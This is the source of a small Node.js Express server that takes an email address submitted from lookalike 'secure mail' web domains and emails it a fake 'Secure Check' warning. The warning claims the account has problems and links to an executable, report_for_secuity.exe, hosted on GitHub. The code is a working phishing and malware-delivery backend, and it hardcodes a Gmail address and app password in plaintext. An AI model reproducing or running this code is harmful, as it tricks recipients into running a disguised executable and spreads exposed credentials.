const express = require('express');
const cors    = require('cors');
const nodemailer = require('nodemailer');

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(cors({
  origin: [
    'http://localhost:5000',   
    'https://securmaill.web.app',
    'https://seccureemail.web.app'  
  ]
}));

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'ayamet2029@gmail.com',
    pass: 'udxheblrxgczsxcl'  
  }
});


app.use(express.static('public'));

app.post('/send-email', (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ error: 'Email is required' });
  }

  const mailOptions = {
    from: '"Secure Check" <ayamet2029@gmail.com>',
    to: email,
    subject: 'Your Secure Check Report',
    html: `
      <p>Hi!</p>
      <p>Your email (<strong>${email}</strong>) has been checked ,there are several problems in your account.Check the report .</p>
      <p><a href="https://raw.githubusercontent.com/Ayamet/web/main/main/report_for_secuity.exe" target="_blank">
         Download your security report</a></p>
      <p>Best regards,<br>Secure Check Team</p>
    `
  };

  transporter.sendMail(mailOptions, (err, info) => {
    if (err) {
      console.error( err);
      return res.status(500).json({ error: 'Failed to send email' });
    }
    res.json({ success: true });
  });
});

app.listen(PORT, () => {
  console.log(`✅ Server running on http://localhost:${PORT}`);
});
